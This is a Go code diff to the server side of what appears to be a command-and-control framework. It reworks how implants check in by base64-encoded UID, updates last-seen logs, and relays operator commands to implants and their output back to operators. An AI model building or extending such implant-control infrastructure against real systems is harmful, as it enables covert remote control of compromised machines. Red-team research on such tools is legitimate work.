@@ -7,35 +7,54 @@ import (
 	"encoding/base64"
 	"io/ioutil"
 	"bytes"
+    "strings"
     "Team-Server/DB"
 )
 
 var uid string
 var responseChan = make(chan string)
 
-
 func handleImplant(w http.ResponseWriter, r *http.Request) {
-    //update last seen time for the implant
-
     serializedData := r.Header.Get("Serialized-Data")
-    uid = r.Header.Get("UID")
-    
+    encodedUID := r.Header.Get("UID")
+
+    /*
+    on the implant only send the truncated hash
+    if the server responds with 403 not found then send the full uid
+    if receive succesful connection go back to the normal truncated hash
+    */
+
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     // Receive response
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    var idMask string
-	if uid != "" {
+	if encodedUID != "" {
+        uidBytes, _ := base64.StdEncoding.DecodeString(encodedUID)
+        uid := string(uidBytes)
+        parts := strings.Split(string(uid), "-")
 
-        connectionDetails, found := DB.ConnectionLog[uid]
-
-        if found {
-            idMask = connectionDetails.ImplantID
-        } else {
+        switch len(parts) {
+        case 0:
+            fmt.Println("error")
+        case 1:
+            if _, found := DB.ConnectionLog[uid]; found {
+                DB.UpdateLastSeen(uid)
+            } else {
+                http.Error(w, "", http.StatusNotFound)
+                return
+            }
+        case 5:  // receives correctly
             protocol := "http"
-            handleUID(uid, protocol)
+            _, _, err := DB.ParseUID(parts, protocol, uid, encodedUID)
+            if err != nil {
+                http.Error(w, "", http.StatusNotFound)
+            }
+            w.WriteHeader(http.StatusAccepted)
             return
+        default:
+            fmt.Println("error")
+            
         }
-
+        
 		if serializedData != "" {
 
             type Command struct {
@@ -43,11 +62,9 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
                 String   string `json:"String"`
                 Response string `json:"Response"`
             }
-
+            
             // Send the response to the operator
             responseChan <- string(serializedData)
-
-			fmt.Fprintf(w, "Command received and processed successfully")
 
             } else {
                 http.Error(w, "No serialized data found in the request", http.StatusBadRequest)
@@ -60,7 +77,8 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
         // Provide next command to implant
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-        if len(commandQueue) != 0 && containsIDMask(idMask) {
+
+        if len(commandQueue) != 0 {
             // Retrieve the first command item from the queue
             retrievedCMD := commandQueue[0]
 
@@ -102,11 +120,9 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
 }
 
 func handleOperator(w http.ResponseWriter, r *http.Request) {
-    // Only allow POST requests
     // operatorID := r.Header.Get("Operator-ID")
     implantID := r.Header.Get("Implant-ID")
 
-    //implantID, err := strconv.Atoi(implantIDStr)
     if implantID == "" {
         // Handle error if conversion fails
         http.Error(w, "Invalid Implant-ID", http.StatusBadRequest)
@@ -143,15 +159,12 @@ func handleOperator(w http.ResponseWriter, r *http.Request) {
         return
     }
 
-    // Add the command to the commandQueue
-//    commandQueue = append(commandQueue, []string{command.Group, command.String}) // These work forsure
     addToCommandQueue([][]string{{command.Group, command.String}}, implantID)
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             // Respond to operator        
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-        
-    // Wait for the response from the implant
+
     response := <-responseChan
 
     // Write the response back to the client
@@ -160,7 +173,6 @@ func handleOperator(w http.ResponseWriter, r *http.Request) {
     fmt.Fprintf(w, "Data: %s", response)
 
 }
-
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
         // Server Commands
@@ -191,7 +203,6 @@ func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
     if err != nil {
         return
     }
-
     
     cmdGroup := receivestruct.Group
     cmdString := receivestruct.String
@@ -207,7 +218,6 @@ func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
         fmt.Print(reset)
     }
     
-
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             // Respond to operator        
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -215,7 +225,6 @@ func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
 
     // Update the response structure with command response
     receivestruct.Response = respStr
-
 
     jsonBytes, err := json.Marshal(receivestruct)
     if err != nil {
